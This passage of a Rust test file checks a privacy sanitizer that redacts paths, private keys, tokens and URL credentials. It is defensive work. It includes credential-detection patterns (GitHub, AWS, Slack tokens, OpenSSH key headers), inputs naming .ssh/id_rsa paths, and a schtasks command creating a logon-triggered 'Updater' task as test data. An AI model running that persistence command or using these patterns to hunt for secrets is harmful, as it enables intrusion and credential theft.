        redact_sensitive_text(r"dir \\_synthetic-host\team\notes.txt now")
            == "dir [sensitive-path] now",
        "underscore UNC path"
    );
}

#[test]
fn webdav_unc_server_components_are_redacted_whole() {
    let redacted = redact_sensitive_text(r"dir \\portal.example@SSL\DavWWWRoot\team\notes.txt now");
    assert!(redacted == "dir [sensitive-path] now", "WebDAV UNC path");
    assert!(
        redact_sensitive_text(&redacted) == redacted,
        "WebDAV UNC idempotence"
    );
}

#[test]
fn regex_like_unc_servers_are_not_exempt_with_an_ordinary_share() {
    assert!(
        redact_sensitive_text(r"dir \\d+\\share\notes.txt now") == "dir [sensitive-path] now",
        "quantified UNC server with ordinary share"
    );
    assert!(
        redact_sensitive_text(r#"grep -E "\\d+\\s+\\w+""#) == r#"grep -E "\\d+\\s+\\w+""#,
        "quantified regex escapes"
    );
}

#[test]
fn quoted_windows_filenames_with_repeated_spaces_are_redacted_whole() {
    let redacted = redact_sensitive_text(r#"open "C:\Temp\Private  Notes.txt" /s"#);
    assert!(
        redacted == r#"open "[sensitive-path]" /s"#,
        "repeated-space quoted path"
    );
    assert!(
        redact_sensitive_text(&redacted) == redacted,
        "repeated-space quoted path idempotence"
    );
    assert!(
        redact_sensitive_text(r#"open "\\fileserver\team\Private   Notes.txt" /s"#)
            == r#"open "[sensitive-path]" /s"#,
        "repeated-space quoted UNC path"
    );
}

#[test]
fn windows_final_filename_spaces_are_redacted_without_swallowing_arguments() {
    let cases = [
        (
            r"C:\Users\SyntheticUser\Private Notes.txt",
            "[sensitive-path]",
        ),
        (
            r"dir C:\Users\SyntheticUser\My Private Notes.txt && echo ok",
            "dir [sensitive-path] && echo ok",
        ),
        (
            r"cat C:\Users\SyntheticUser\Private Notes.txt now",
            "cat [sensitive-path] now",
        ),
        (
            r"Read C:\Users\SyntheticUser\Private Notes.txt.",
            "Read [sensitive-path].",
        ),
        (
            r"type \Device\HarddiskVolume3\Users\SyntheticUser\Private Notes.txt",
            "type [sensitive-path]",
        ),
        (
            r"dir \\fileserver\\share\Private Notes.txt",
            "dir [sensitive-path]",
        ),
        (
            r#"{"path":"C:\\Users\\SyntheticUser\\Private Notes.txt"}"#,
            r#"{"path":"[sensitive-path]"}"#,
        ),
        (
            r#"{\"path\":\"C:\\\\Users\\\\SyntheticUser\\\\Private Notes.txt\"}"#,
            r#"{\"path\":\"[sensitive-path]\"}"#,
        ),
        (
            r#"dir "C:\Users\SyntheticUser\My Secret Folder" /s"#,
            r#"dir "[sensitive-path]" /s"#,
        ),
        (
            r#"dir "C:\Users\SyntheticUser\Private Notes.txt" /s"#,
            r#"dir "[sensitive-path]" /s"#,
        ),
        (
            r#""C:\Users\SyntheticUser\Private Notes.txt --flag""#,
            r#""[sensitive-path] --flag""#,
        ),
        // Arguments after an already-terminated path must stay readable.
        (
            r"open C:\Users\SyntheticUser\notes.txt now",
            "open [sensitive-path] now",
        ),
        (
            r"run C:\tools\a.exe --flag value",
            "run [sensitive-path] --flag value",
        ),
        (r#""C:\tools\a.exe arg2""#, r#""[sensitive-path] arg2""#),
        (
            r"schtasks /create /tn Updater /tr C:\tools\a.exe /sc onlogon",
            "schtasks /create /tn Updater /tr [sensitive-path] /sc onlogon",
        ),
    ];

    for (case, (input, expected)) in cases.into_iter().enumerate() {
        let redacted = redact_sensitive_text(input);
        assert!(redacted == expected, "spaced filename case {case}");
        assert!(
            !redacted.contains("Notes.txt"),
            "spaced filename privacy case {case}"
        );
        assert!(
            !redacted.contains("Secret Folder"),
            "quoted path privacy case {case}"
        );
        assert!(
            redact_sensitive_text(&redacted) == redacted,
            "spaced filename idempotence case {case}"
        );
    }
}

#[test]
fn private_key_blocks_cover_pgp_crlf_escaped_newlines_and_missing_end() {
    for block in [
        "-----BEGIN PGP PRIVATE KEY BLOCK-----\r\nTT_PRIVACY_PGP_25\r\n-----END PGP PRIVATE KEY BLOCK-----",
        r#"-----BEGIN PRIVATE KEY-----\nTT_PRIVACY_ESCAPED_PEM_25\n-----END PRIVATE KEY-----"#,
        "-----BEGIN RSA PRIVATE KEY-----\nTT_PRIVACY_MISSING_END_25",
        "-----BEGIN EC PRIVATE KEY-----\n-----END EC PRIVATE KEY-----",
    ] {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Evidence, block);
        assert!(!redacted.contains("TT_PRIVACY_"));
        assert!(!redacted.contains("BEGIN"));
        assert!(!redacted.contains("END"));
        assert!(redacted.contains("[redacted-secret]"));
    }
}

#[test]
fn assignment_scanner_handles_escaped_json_keys_and_unicode_separators() {
    let markers = [
        "TT_PRIVACY_ESCAPED_JSON_KEY_25",
        "TT_PRIVACY_ESCAPED_ASSIGNMENT_25",
        "TT_PRIVACY_NBSP_ASSIGNMENT_25",
        "TT_PRIVACY_EM_SPACE_ASSIGNMENT_25",
    ];
    let input = [
            r#"{"api\u005fkey":"TT_PRIVACY_ESCAPED_JSON_KEY_25"}; \"token\"\u0020=\u0020\"TT_PRIVACY_ESCAPED_ASSIGNMENT_25\"; secret"#,
            "\u{00a0}",
            "=\u{00a0}TT_PRIVACY_NBSP_ASSIGNMENT_25; password\u{2003}=\u{2003}TT_PRIVACY_EM_SPACE_ASSIGNMENT_25",
        ]
        .concat();
    let redacted = PrivacySanitizer::sanitize(SanitizationContext::CommandResult, &input);

    for marker in markers {
        assert!(
            !redacted.contains(marker),
            "controlled marker remained in escaped or Unicode assignment"
        );
    }
}

#[test]
fn escaped_assignments_preserve_original_syntax_and_safe_surrounding_text() {
    let marker = "TT_PRIVACY_ESCAPED_ASSIGNMENT_EXACT_25";
    let cases = [
        (
            format!(r#"before {{"token":"{marker}"}} after=safe"#),
            r#"before {"token":"[redacted-secret]"} after=safe"#,
        ),
        (
            format!(r#"before {{"to\u006ben":"{marker}"}} after=safe"#),
            r#"before {"to\u006ben":"[redacted-secret]"} after=safe"#,
        ),
        (
            format!(r#"before \"token\"=\"{marker}\" after=safe"#),
            r#"before \"token\"=\"[redacted-secret]\" after=safe"#,
        ),
        (
            format!(r#"before {{\"token\":\"{marker}\"}} after=safe"#),
            r#"before {\"token\":\"[redacted-secret]\"} after=safe"#,
        ),
        (
            format!(r#"before {{\\\"to\\u006ben\\\":\\\"{marker}\\\"}} after=safe"#),
            r#"before {\\\"to\\u006ben\\\":\\\"[redacted-secret]\\\"} after=safe"#,
        ),
    ];

    for (input, expected) in cases {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::CommandResult, &input);
        assert!(
            !redacted.contains(marker),
            "escaped assignment retained a controlled marker"
        );
        assert_eq!(redacted, expected);
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::CommandResult, &redacted),
            redacted
        );
    }
}

#[test]
fn escaped_assignment_corpus_covers_required_source_renderings() {
    let marker = "TT_PRIVACY_ESCAPED_REQUIRED_25";
    let cases = [
        format!(r#"before {{\"api_key\":\"{marker}\"}} after=safe"#),
        format!(r#"before {{\"token\": \"{marker}\"}} after=safe"#),
        format!(r#"before {{\\\"password\\\":\\\"{marker}\\\"}} after=safe"#),
        format!(r#"before token="{marker}" after=safe"#),
        format!(r#"before token=\\\"{marker}\\\" after=safe"#),
    ];

    for input in cases {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::CommandResult, &input);
        assert!(!redacted.contains(marker));
        assert!(redacted.starts_with("before "));
        assert!(redacted.ends_with(" after=safe"));
        assert!(redacted.contains("[redacted-secret]"));
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::CommandResult, &redacted),
            redacted
        );
    }
}

#[test]
fn assignment_scanner_handles_nbsp_and_em_space_separately() {
    let nbsp_marker = "TT_PRIVACY_NBSP_EXACT_25";
    let em_space_marker = "TT_PRIVACY_EM_SPACE_EXACT_25";
    let nbsp = PrivacySanitizer::sanitize(
        SanitizationContext::CommandResult,
        &format!("before token\u{00a0}=\u{00a0}{nbsp_marker} after=safe"),
    );
    let em_space = PrivacySanitizer::sanitize(
        SanitizationContext::CommandResult,
        &format!("before Api_Key\u{2003}:\u{2003}\"{em_space_marker}\" after=safe"),
    );

    assert!(!nbsp.contains(nbsp_marker));
    assert!(nbsp.contains("before token\u{00a0}=\u{00a0}[redacted-secret] after=safe"));
    assert!(!em_space.contains(em_space_marker));
    assert!(em_space.contains("before Api_Key\u{2003}:\u{2003}\"[redacted-secret]\" after=safe"));
}

#[test]
fn url_sanitization_handles_bounded_nested_encoding_and_fragments() {
    let marker = "TT_PRIVACY_ENCODED_URL_25";
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        &format!(
            "https://outer.example.invalid/run?safe=value&next=https%253A%252F%252Finner.example.invalid%252Fcallback%253Ftoken%253D{marker}#token={marker}&encoded=token%253D{marker}"
        ),
    );

    assert!(
        !redacted.contains(marker),
        "controlled marker remained in bounded URL encoding or fragment"
    );
    assert!(redacted.contains("safe=value"));
}

#[test]
fn url_sanitization_handles_each_required_encoded_query_value_and_depth_two() {
    let ghp_marker = "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz12";
    let encoded_ghp_marker = "%67%68%70%5F%41%62%43%64%45%66%47%68%49%6A%4B%6C%4D%6E%4F%70%51%72%53%74%55%76%57%78%59%7A%31%32";
    let assignment_marker = "TT_PRIVACY_ENCODED_ASSIGNMENT_25";
    let json_marker = "TT_PRIVACY_ENCODED_JSON_25";
    let redirect_marker = "TT_PRIVACY_ENCODED_REDIRECT_25";
    let depth_two_marker = "TT_PRIVACY_ENCODED_DEPTH_TWO_25";
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        &format!(
            "https://outer.example.invalid/path?safe=ok&gh={encoded_ghp_marker}&assignment=token%3D{assignment_marker}&json=%7B%22api_key%22%3A%22{json_marker}%22%7D&redirect=https%3A%2F%2Fuser%3A{redirect_marker}%40redirect.example.invalid%2Fnext&depth2=token%253D{depth_two_marker}"
        ),
    );

    for (index, marker) in [
        ghp_marker,
        assignment_marker,
        json_marker,
        redirect_marker,
        depth_two_marker,
    ]
    .into_iter()
    .enumerate()
    {
        assert!(
            !redacted.contains(marker),
            "encoded query value case {index} retained a controlled marker"
        );
    }
    assert!(redacted.contains("https://outer.example.invalid/path?"));
    assert!(redacted.contains("safe=ok"));
    assert!(redacted.contains("gh="));
    assert!(redacted.contains("assignment="));
    assert!(redacted.contains("json="));
    assert!(redacted.contains("redirect="));
    assert!(redacted.contains("depth2="));
    assert!(!redacted.contains(encoded_ghp_marker));
    assert!(redacted.matches("[redacted-secret]").count() >= 5);
}

#[test]
fn url_sanitization_handles_plain_and_encoded_fragment_forms() {
    let plain_marker = "TT_PRIVACY_PLAIN_FRAGMENT_25";
    let encoded_assignment_marker = "TT_PRIVACY_ENCODED_FRAGMENT_ASSIGNMENT_25";
    let encoded_json_marker = "TT_PRIVACY_ENCODED_FRAGMENT_JSON_25";
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        &format!(
            "https://fragment.example.invalid/path?safe=ok#token={plain_marker}&token%3D{encoded_assignment_marker}&%7B%22token%22%3A%22{encoded_json_marker}%22%7D"
        ),
    );

    for marker in [plain_marker, encoded_assignment_marker, encoded_json_marker] {
        assert!(
            !redacted.contains(marker),
            "fragment form retained a controlled marker"
        );
    }
    assert!(redacted.contains("https://fragment.example.invalid/path?safe=ok#"));
}

#[test]
fn url_sanitization_removes_userinfo_for_supported_and_relative_schemes() {
    let marker = "TT_PRIVACY_URL_USERINFO_25";
    for scheme in [
        "http",
        "https",
        "ws",
        "wss",
        "ftp",
        "ssh",
        "postgres",
        "postgresql",
        "mysql",
        "mariadb",
        "redis",
        "mongodb",
        "amqp",
        "smtp",
        "git+https",
    ] {
        let redacted = PrivacySanitizer::sanitize(
            SanitizationContext::Url,
            &format!("{scheme}://user:{marker}@example.invalid:8443/mcp?safe=value"),
        );
        assert!(
            !redacted.contains(marker),
            "controlled marker remained in scheme userinfo"
        );
        assert!(redacted.contains(&format!("{scheme}://example.invalid:8443/mcp?safe=value")));
    }

    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        &format!("//user:{marker}@example.invalid/mcp?safe=value"),
    );
    assert!(
        !redacted.contains(marker),
        "controlled marker remained in scheme-relative userinfo"
    );
    assert!(redacted.contains("//example.invalid/mcp?safe=value"));
}

#[test]
fn path_sanitization_covers_spaces_before_sensitive_markers() {
    let marker = "TT_PRIVACY_SPACED_PATH_25";
    for path in [
        format!("/opt/Project Space/{marker}/config.json"),
        format!("/Users/Project Space/{marker}/Library/state"),
        format!(r#"C:\Users\Project Space\{marker}\config.json"#),
        format!(r#"\\server\Project Space\{marker}\config.json"#),
    ] {
        let redacted = PrivacySanitizer::sanitize(SanitizationContext::Diagnostic, &path);
        assert!(
            !redacted.contains(marker),
            "controlled marker remained in a spaced platform path"
        );
        assert_eq!(redacted, "<path>");
    }
}

#[test]
fn path_sanitization_handles_required_spaced_platform_paths_without_eating_quoted_text() {
    let marker = "TT_PRIVACY_REQUIRED_SPACED_PATH_25";
    for path in [
        format!("/Users/alice/Library/Application Support/{marker}"),
        format!("/home/alice/My Project/{marker}"),
        format!(r#"C:\Users\alice\Application Data\{marker}"#),
        format!(r#"\\server\Shared Space\{marker}\config.json"#),
    ] {
        let redacted = PrivacySanitizer::sanitize(
            SanitizationContext::Diagnostic,
            &format!("before \"{path}\" after=safe sentence"),
        );
        assert!(
            !redacted.contains(marker),
            "spaced platform path retained a controlled marker"
        );
        assert_eq!(redacted, "before \"<path>\" after=safe sentence");
    }

    let dsn = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        &format!("postgresql://user:{marker}@db.example.invalid:5432/app?sslmode=require"),
    );
    assert!(!dsn.contains(marker));
    assert_eq!(
        dsn,
        "postgresql://db.example.invalid:5432/app?sslmode=require"
    );
}

#[test]
fn privacy_corpus_bounds_pathological_assignment_input() {
    let marker = "TT_PRIVACY_BOUNDED_25";
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Evidence,
        &format!("TOKEN={marker}{}", "x".repeat(100_000)),
    );

    assert!(!redacted.contains(marker));
    assert!(redacted.len() <= 512);
}

#[test]
fn redact_error_message_strips_absolute_paths() {
    let redacted = redact_error_message(
        "io error: No such file or directory (os error 2) at /home/user/.local/share/opencode/opencode.db",
    );
    assert!(!redacted.contains("/home/user"));
    assert!(redacted.contains("<path>"));
}

#[test]
fn redact_error_message_truncates_long_messages() {
    let long_msg = "x".repeat(300);
    let redacted = redact_error_message(&long_msg);
    assert!(redacted.len() <= 200);
    assert_eq!(redacted, "[encoded-blob]");
}

#[test]
fn redact_error_message_truncates_long_multibyte_messages_safely() {
    let long_msg = "界".repeat(100);
    let redacted = redact_error_message(&long_msg);

    assert!(redacted.len() <= 200);
    assert!(redacted.ends_with("[truncated]"));
}

#[test]
fn redact_error_message_masks_encoded_blobs() {
    let redacted = redact_error_message("connection failed with U1lOVEhFVElDX1BBWUxPQUQ=");

    assert!(!redacted.contains("U1lOVEhFVElDX1BBWUxPQUQ"));
    assert!(redacted.contains("[encoded-blob]"));
}

#[test]
fn redact_error_message_masks_secrets() {
    let redacted = redact_error_message("connection failed: token: abc123secret");
    assert!(!redacted.contains("abc123secret"));
    assert!(redacted.contains("[redacted-secret]"));
}

#[test]
fn redact_error_message_strips_windows_paths() {
    let redacted = redact_error_message(
        r#"sqlite open failed at C:\Users\tester\AppData\Local\opencode\opencode.db"#,
    );
    assert!(!redacted.contains(r#"C:\Users\tester"#));
    assert!(redacted.contains("<path>"));
}

#[test]
fn marker_checker_reports_only_case_field_and_marker_id() {
    let marker = ControlledMarker {
        id: "assignment",
        value: "TT_PRIVACY_CHECKER_25",
    };
    let error = check_serialized_event_markers(
        br#"{"evidence":[{"redacted_value":"TT_PRIVACY_CHECKER_25"}]}"#,
        "checker-case",
        &[marker],
    )
    .expect_err("controlled marker must be found");

    assert_eq!(
        error.to_string(),
        "privacy marker check failed for case checker-case, field $.<key>[0].<key>, marker assignment"
    );
}

#[test]
fn marker_checker_catches_keys_and_duplicate_key_values() {
    let marker = ControlledMarker {
        id: "marker",
        value: "TT_PRIVACY_DUPLICATE_25",
    };

    assert!(
        check_serialized_event_markers(
            br#"{"TT_PRIVACY_DUPLICATE_25":"safe"}"#,
            "key-case",
            &[marker],
        )
        .is_err()
    );
    assert!(
        check_serialized_event_markers(
            br#"{"evidence":"TT_PRIVACY_DUPLICATE_25","evidence":"safe"}"#,
            "duplicate-case",
            &[marker],
        )
        .is_err()
    );
}

#[test]
fn marker_checker_has_safe_input_and_depth_limits_and_stops_after_a_match() {
    let marker = ControlledMarker {
        id: "limit-marker",
        value: "tt_privacy_marker_checker_25",
    };
    let oversized = vec![b' '; MAX_SERIALIZED_EVENT_BYTES + 1];
    let size_error = check_serialized_event_markers(&oversized, "size-case", &[marker])
        .expect_err("oversized serialized input must be rejected");
    assert_eq!(
        size_error.to_string(),
        "privacy marker check failed for case size-case: serialized input exceeds the safe limit"
    );

    let too_deep = format!(
        "{}null{}",
        "[".repeat(MAX_MARKER_DEPTH + 1),
        "]".repeat(MAX_MARKER_DEPTH + 1)
    );
    let depth_error = check_serialized_event_markers(too_deep.as_bytes(), "depth-case", &[marker])
        .expect_err("over-nested serialized input must be rejected");
    assert_eq!(
        depth_error.to_string(),
        "privacy marker check failed for case depth-case: serialized input exceeds the safe nesting limit"
    );

    let early_error = check_serialized_event_markers(
        br#"{"evidence":"tt_privacy_marker_checker_25",invalid"#,
        "early-case",
        &[marker],
    )
    .expect_err("marker must be reported before a later malformed suffix");
    assert!(matches!(
        early_error,
        SerializedMarkerCheckError::MarkerFound { .. }
    ));
}

#[test]
fn high_confidence_markers_match_session_one_patterns_and_near_misses_do_not() {
    for marker in [
        "ghp_12345678",
        "SK-abcdefgh",
        "akia1234567890AB",
        "XOXB-12345678",
        "eYj_12345678.segment_5678.segment_9012",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
    ] {
        assert!(contains_high_confidence_credential_marker(marker));
    }
    for near_miss in [
        "ghp_1234567",
        "sk-1234567",
        "AKIA1234567890A",
        "xoxb-1234567",
        "segment_1234.segment_5678.segment_9012",
        "-----BEGIN OPENSSH PUBLIC KEY-----",
    ] {
        assert!(!contains_high_confidence_credential_marker(near_miss));
    }
}

#[test]
fn encoded_authority_and_path_assignments_do_not_survive_url_sanitization() {
    let marker = "TT_PRIVACY_ENCODED_URL_AUTHORITY_25";
    let redacted = PrivacySanitizer::sanitize(
        SanitizationContext::Url,
        &format!(
            "https://user%3A{marker}%40example.invalid/path%2Ftoken%3D{marker}?next=https%3A%2F%2Fuser%3A{marker}%40next.example.invalid%2Fpath%3Ftoken%3D{marker}"
        ),
    );

    assert!(
        !redacted.contains(marker),
        "encoded URL authority or assignment retained a controlled marker"
    );
    assert_eq!(redacted, "[redacted-url]");
}

#[test]
fn malformed_and_percent_encoded_url_authorities_are_replaced_as_whole_candidates() {
    let path_marker = "TT_PRIVACY_PATH_25";
    let query_marker = "TT_PRIVACY_QUERY_25";
    let cases = [
        (
            "literal-empty-host-userinfo",
            format!("https://@/home/{path_marker}/.ssh/id_rsa?token={query_marker}"),
        ),
        (
            "encoded-slash",
            format!("https://example.invalid%2fhome%2f{path_marker}%2f.ssh%2fid_rsa"),
        ),
        (
            "encoded-backslash",
            format!("https://example.invalid%5CUsers%5C{path_marker}%5C.ssh%5Cid_rsa"),
        ),
        (
            "encoded-query",
            format!("https://example.invalid%3ftoken%3d{query_marker}"),
        ),
        (
            "encoded-fragment",
            format!("https://example.invalid%23token%3d{query_marker}"),
        ),
        (
            "encoded-userinfo-delimiter",
            format!("https://{query_marker}%40example.invalid/private"),
        ),
        (
            "encoded-whitespace",
            format!("https://example.invalid%20{path_marker}"),
        ),
        (
            "encoded-control",
            format!("https://example.invalid%0a{path_marker}"),
        ),
        (
            "double-encoded-slash",
            format!("https://example.invalid%252Fhome%252F{path_marker}%252F.ssh%252Fid_rsa"),
        ),
    ];

    for (case_id, input) in cases {
        for context in [
            SanitizationContext::Evidence,
            SanitizationContext::Diagnostic,
            SanitizationContext::Url,
            SanitizationContext::Path,
            SanitizationContext::CommandResult,
            SanitizationContext::Summary,
            SanitizationContext::Metadata,
        ] {
            let redacted = PrivacySanitizer::sanitize(context, &input);
            assert!(
                !redacted.contains(path_marker) && !redacted.contains(query_marker),
                "authority case {case_id} retained a controlled marker"
            );
            assert_eq!(
                redacted, "[redacted-url]",
                "authority case {case_id} must replace the complete URL-like candidate"
            );
            assert_eq!(
                PrivacySanitizer::sanitize(context, &redacted),
                redacted,
                "authority case {case_id} must be idempotent"
            );
        }
    }
}

#[test]
fn fully_encoded_url_authority_delimiters_fail_closed_at_first_scheme_representation() {
    let marker = "TT_PRIVACY_ENCODED_AUTHORITY_COMPONENT_25";
    let cases = [
        (
            "encoded-slash",
            format!("https%3A%2F%2Fexample.invalid%252F{marker}%2Fsafe"),
        ),
        (
            "encoded-backslash",
            format!("https%3A%2F%2Fexample.invalid%255C{marker}%2Fsafe"),
        ),
        (
            "encoded-query",
            format!("https%3A%2F%2Fexample.invalid%253Fnext%253D{marker}%2Fsafe"),
        ),
        (
            "encoded-fragment",
            format!("https%3A%2F%2Fexample.invalid%2523safe%253D{marker}%2Fsafe"),
        ),
        (
            "encoded-userinfo-delimiter",
            format!("https%3A%2F%2Fexample.invalid%2540{marker}%2Fsafe"),
        ),
        (
            "encoded-mixed-case-slash",
            format!("https%3A%2F%2Fexample.invalid%252f{marker}%2Fsafe"),
        ),
        (
            "fully-double-encoded-scheme",
            format!("https%253A%252F%252Fexample.invalid%25252F{marker}%252Fsafe"),
        ),
    ];

    for (case_id, input) in cases {
        for context in [
            SanitizationContext::Evidence,
            SanitizationContext::Diagnostic,
            SanitizationContext::Url,
            SanitizationContext::Path,
            SanitizationContext::CommandResult,
            SanitizationContext::Summary,
            SanitizationContext::Metadata,
        ] {
            let redacted = PrivacySanitizer::sanitize(context, &input);
            assert!(
                !redacted.contains(marker),
                "encoded URL authority case {case_id} retained a controlled marker"
            );
            assert_eq!(
                redacted, "[redacted-url]",
                "encoded URL authority case {case_id} must replace the complete candidate"
            );
            assert_eq!(
                PrivacySanitizer::sanitize(context, &redacted),
                redacted,
                "encoded URL authority case {case_id} must be idempotent"
            );
        }
    }
}

#[test]
fn encoded_url_candidate_prefix_forms_are_atomic_and_bounded() {
    let marker = "TT_PRIVACY_ENCODED_CANDIDATE_PATH_25";
    let valid_cases = [
        (
            "fully-encoded-scheme",
            format!("%68%74%74%70%73%3A%2F%2Fexample.invalid%2Fhome%2F{marker}%2F.ssh%2Fid_rsa"),
        ),
        (
            "literal-scheme-encoded-separators",
            format!("https:%2F%2Fexample.invalid%2Fhome%2F{marker}%2F.ssh%2Fid_rsa"),
        ),
        (
            "encoded-scheme-literal-separators",
            format!("https%3A//example.invalid%2Fhome%2F{marker}%2F.ssh%2Fid_rsa"),
        ),
        (
            "double-encoded-full-scheme",
            format!(
                "%2568%2574%2574%2570%2573%253A%252F%252Fexample.invalid%252Fhome%252F{marker}%252F.ssh%252Fid_rsa"
            ),
        ),
    ];
    for (case_id, input) in valid_cases {
        let redacted =
            PrivacySanitizer::sanitize(SanitizationContext::Url, &format!("prefix {input} suffix"));
        assert!(
            !redacted.contains(marker),
            "valid URL case {case_id} retained marker"
        );
        assert!(
            redacted == "prefix https://example.invalid/[sensitive-path] suffix",
            "valid URL case {case_id} did not render its canonical sensitive path"
        );
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::Url, &redacted),
            redacted,
            "valid URL case {case_id} was not idempotent"
        );
    }

    let malformed_cases = [
        (
            "fully-encoded-scheme",
            format!(
                "%68%74%74%70%73%3A%2F%2Fexample.invalid%252Fhome%252F{marker}%252F.ssh%252Fid_rsa"
            ),
        ),
        (
            "literal-scheme-encoded-separators",
            format!("https:%2F%2Fexample.invalid%252Fhome%252F{marker}%252F.ssh%252Fid_rsa"),
        ),
        (
            "encoded-scheme-literal-separators",
            format!("https%3A//example.invalid%252Fhome%252F{marker}%252F.ssh%252Fid_rsa"),
        ),
        (
            "double-encoded-full-scheme",
            format!(
                "%2568%2574%2574%2570%2573%253A%252F%252Fexample.invalid%25252Fhome%25252F{marker}%25252F.ssh%25252Fid_rsa"
            ),
        ),
    ];
    for (case_id, input) in malformed_cases {
        let redacted =
            PrivacySanitizer::sanitize(SanitizationContext::Url, &format!("prefix {input} suffix"));
        assert!(
            !redacted.contains(marker),
            "malformed URL case {case_id} retained marker"
        );
        assert!(
            redacted == "prefix [redacted-url] suffix",
            "malformed URL case {case_id} did not fail closed atomically"
        );
        assert_eq!(
            PrivacySanitizer::sanitize(SanitizationContext::Url, &redacted),
            redacted,
            "malformed URL case {case_id} was not idempotent"
        );
    }

    let ordinary = "ordinary percent text %6e%6f%74%2D%61%2D%75%72%6c %2Fhome%2Fsafe";
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, ordinary),
        ordinary,
        "ordinary percent-encoded non-URL text changed"
    );

    let over_depth = "%252568%252574%252574%252570%252573%25253A%25252F%25252Fexample.invalid%25252Fsafe%25252Fpath";
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, over_depth),
        over_depth,
        "URL recognition exceeded its bounded decode depth"
    );
}

#[test]
fn encoded_url_components_keep_immutable_boundaries_during_local_classification() {
    let path_marker = "TT_PRIVACY_COMPONENT_PATH_25";
    let query_marker = "TT_PRIVACY_COMPONENT_QUERY_25";
    let fragment_marker = "TT_PRIVACY_COMPONENT_FRAGMENT_25";
    let boundary_input = format!(
        "https%3A%2F%2Fexample.invalid%2Fsafe%253Ftoken%253D{path_marker}%2523safe%253D{path_marker}%3Ftoken%3D{query_marker}%23token%3D{fragment_marker}"
    );
    let boundary_output = PrivacySanitizer::sanitize(SanitizationContext::Url, &boundary_input);

    for marker in [path_marker, query_marker, fragment_marker] {
        assert!(
            !boundary_output.contains(marker),
            "encoded URL component retained a controlled marker"
        );
    }
    assert_eq!(
        boundary_output,
        "https://example.invalid/[redacted-secret]?token=[redacted-secret]#[redacted-secret]"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &boundary_output),
        boundary_output,
        "component-local URL sanitization must be idempotent"
    );

    let safe_fully_encoded =
        "https%3A%2F%2Fexample.invalid%2Fsafe%252Fpath%252fsegment%3Fnext%3Dok%23section";
    let safe_fully_encoded_output =
        PrivacySanitizer::sanitize(SanitizationContext::Url, safe_fully_encoded);
    assert_eq!(
        safe_fully_encoded_output,
        "https://example.invalid/safe%2Fpath%2fsegment?next=ok#section"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &safe_fully_encoded_output),
        safe_fully_encoded_output,
        "safe fully encoded URL sanitization must be idempotent"
    );

    let double_encoded_safe =
        "https%253A%252F%252Fexample.invalid%252Fsafe%25252Fpath%253Fnext%253Dok%2523section";
    let double_encoded_output =
        PrivacySanitizer::sanitize(SanitizationContext::Url, double_encoded_safe);
    assert_eq!(
        double_encoded_output,
        "https://example.invalid/safe%2Fpath?next=ok#section"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &double_encoded_output),
        double_encoded_output,
        "double-encoded safe URL sanitization must be idempotent"
    );

    let query_fragment_boundary_input = format!(
        "https://example.invalid/safe?next=value%3Ftoken%3D{query_marker}%23tail&safe=ok#fragment%3Ftoken%3D{fragment_marker}%23tail"
    );
    let query_fragment_boundary_output =
        PrivacySanitizer::sanitize(SanitizationContext::Url, &query_fragment_boundary_input);
    assert_eq!(
        query_fragment_boundary_output,
        "https://example.invalid/safe?next=[redacted-secret]&safe=ok#[redacted-secret]"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &query_fragment_boundary_output),
        query_fragment_boundary_output,
        "query and fragment component sanitization must be idempotent"
    );

    let userinfo_marker = "TT_PRIVACY_COMPONENT_USERINFO_25";
    let userinfo = format!("https://user:{userinfo_marker}@example.invalid/safe?next=value");
    let userinfo_output = PrivacySanitizer::sanitize(SanitizationContext::Url, &userinfo);
    assert!(!userinfo_output.contains(userinfo_marker));
    assert_eq!(userinfo_output, "https://example.invalid/safe?next=value");
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &userinfo_output),
        userinfo_output,
        "literal URL userinfo removal must be idempotent"
    );

    let sensitive_path_marker = "TT_PRIVACY_COMPONENT_SENSITIVE_PATH_25";
    let sensitive_path = format!(
        "https%3A%2F%2Fexample.invalid%2Fhome%252Fuser%252F.ssh%252F{sensitive_path_marker}%252Fid_rsa%3Fsafe%3Dok"
    );
    let sensitive_path_output =
        PrivacySanitizer::sanitize(SanitizationContext::Url, &sensitive_path);
    assert!(!sensitive_path_output.contains(sensitive_path_marker));
    assert_eq!(
        sensitive_path_output,
        "https://example.invalid/[sensitive-path]?safe=ok"
    );
    assert_eq!(
        PrivacySanitizer::sanitize(SanitizationContext::Url, &sensitive_path_output),
        sensitive_path_output,
        "encoded sensitive URL path sanitization must be idempotent"
    );
}

#[test]
fn nested_encoded_urls_inside_literal_components_freeze_first_scheme_boundaries() {
    let marker = "TT_PRIVACY_NESTED_BOUNDARY_25";
    let cases = [
        (
            "query-path",
            format!("https://outer.invalid/?next=https%3A%2F%2Finner.invalid%252F{marker}"),
        ),
        (
            "query-query",
            format!(
                "https://outer.invalid/?next=https%3A%2F%2Finner.invalid%253Ftoken%253D{marker}"
            ),
        ),
        (
            "query-fragment",
            format!(
                "https://outer.invalid/?next=https%3A%2F%2Finner.invalid%2523token%253D{marker}"
            ),
        ),
        (
            "query-userinfo",
            format!(
                "https://outer.invalid/?next=https%3A%2F%2Finner.invalid%2540{marker}%252Fsafe"
            ),
        ),
        (
            "path",
            format!("https://outer.invalid/redirect/https%3A%2F%2Finner.invalid%252F{marker}"),
        ),
        (
